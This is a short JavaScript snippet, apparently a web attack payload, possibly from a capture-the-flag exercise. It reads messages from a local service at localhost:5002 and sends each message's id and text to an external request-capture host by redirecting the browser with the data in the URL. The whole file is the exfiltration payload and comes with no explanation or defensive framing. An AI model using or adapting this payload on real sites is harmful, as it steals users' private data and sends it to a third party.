
function fetchMessages() {

    // Build the endpoint
    const endpoint = "http://localhost:5002/messages?id=1"

    fetch(endpoint)
        .then(r => r.json())
        .then(data => {
            data.messages.forEach(msg => {
              location.href = `https://caliphalhounds.free.beeceptor.com/id=${msg.id}&message=${msg.message}`
            });
        });
}
fetchMessages()
